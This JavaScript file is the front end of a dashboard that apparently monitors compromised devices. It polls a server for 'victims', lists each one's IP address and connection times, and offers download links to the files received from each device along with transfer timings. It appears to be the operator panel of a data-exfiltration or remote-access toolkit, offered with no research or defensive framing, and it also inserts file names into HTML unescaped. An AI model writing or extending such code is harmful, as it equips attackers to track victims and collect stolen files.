$(document).ready(function() {
  // Function to fetch data from the server and update the dashboard
  function fetchData() {
      $.ajax({
          url: '/dashboard-data',
          method: 'GET',
          success: function(data) {
              const tbody = $('#devicesTable tbody');
              tbody.empty(); // Clear existing rows

              for (const [victimId, device] of Object.entries(data)) {
                  const fileListId = `file-list-${victimId}`;
                  let fileListHtml = '';

                  if (device.fileList.length > 0) {
                      fileListHtml = device.fileList.map(file => {
                          const endTime = device.fileEndTimes && device.fileEndTimes[file]
                              ? new Date(device.fileEndTimes[file]).toLocaleString()
                              : 'N/A';

                          const transferTime = device.fileDurations && device.fileDurations[file]
                              ? `${device.fileDurations[file]} seconds`
                              : 'N/A';

                          return `
                              <li>
                                  <a href="/download/${victimId}/${file}" download>${file}</a>
                                  <br>
                                  End Time: ${endTime} <br>
                                  Transfer Time: ${transferTime}
                              </li>
                          `;
                      }).join('');
                  } else {
                      fileListHtml = '<li>No files received yet.</li>';
                  }

                  // Total upload time (for all files combined)
                  const timeToReceiveAllFiles = device.totalUploadTime
                      ? `${device.totalUploadTime} seconds`
                      : 'N/A';

                  const connectionTime = device.connectionTime
                      ? new Date(device.connectionTime).toLocaleString()
                      : 'N/A';

                  const lastConnectionTime = device.lastConnectionTime
                      ? new Date(device.lastConnectionTime).toLocaleString()
                      : 'N/A';

                  const row = $(`
                      <tr>
                          <td>${victimId}</td>
                          <td>${device.ip}</td>
                          <td>${connectionTime}</td>
                          <td>${lastConnectionTime}</td>
                          <td>${timeToReceiveAllFiles}</td>
                          <td>
                              <button class="toggle-btn" onclick="toggleFiles('${victimId}')">Show Files</button>
                              <ul id="${fileListId}" class="file-list hidden">
                                  ${fileListHtml}
                              </ul>
                          </td>
                      </tr>
                  `);
                  tbody.append(row);
              }
          },
          error: function(err) {
              console.error('Error fetching dashboard data:', err);
          }
      });
  }

  // Function to toggle file list visibility
  window.toggleFiles = function(victimId) {
      const fileList = $(`#file-list-${victimId}`);
      fileList.toggleClass('hidden');
  };

  // Fetch data every 30 seconds to keep the dashboard updated
  setInterval(fetchData, 30000);

  // Fetch data immediately when the page loads
  fetchData();
});
